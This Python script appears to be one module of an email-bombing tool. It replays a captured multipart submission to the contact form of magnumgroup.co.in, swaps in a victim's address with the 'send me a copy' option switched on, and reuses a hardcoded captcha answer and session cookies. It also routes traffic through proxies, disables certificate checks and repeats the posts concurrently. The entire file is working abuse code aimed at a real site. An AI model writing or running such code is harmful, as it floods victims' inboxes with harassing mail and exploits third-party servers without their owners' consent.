cookies = {
    'PHPSESSID': '3dce191d8fc461b7c0d8a9e4873fce5a',
    '_ga': 'GA1.3.663187228.1677080207',
    '_gid': 'GA1.3.1446469482.1677080207',
    '_gat': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarywclz2VkC84ZFQtv7',
    # 'Cookie': 'PHPSESSID=3dce191d8fc461b7c0d8a9e4873fce5a; _ga=GA1.3.663187228.1677080207; _gid=GA1.3.1446469482.1677080207; _gat=1',
    'Origin': 'http://www.magnumgroup.co.in',
    'Referer': 'http://www.magnumgroup.co.in/magnum-contact.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="name"\r\n\r\nadwadw\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="contact"\r\n\r\n12123132321\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="message"\r\n\r\ntest\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="copy"\r\n\r\non\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="r1"\r\n\r\n2\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="r2"\r\n\r\n9\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="captcha"\r\n\r\n11\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7\r\nContent-Disposition: form-data; name="btnOk2"\r\n\r\nSubmit\r\n------WebKitFormBoundarywclz2VkC84ZFQtv7--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()

        response = requests.post(
            'http://www.magnumgroup.co.in/magnum-contact.php',
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False, proxies=self.get_proxies()
        )
        return response


def main():
    s = 'Success'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
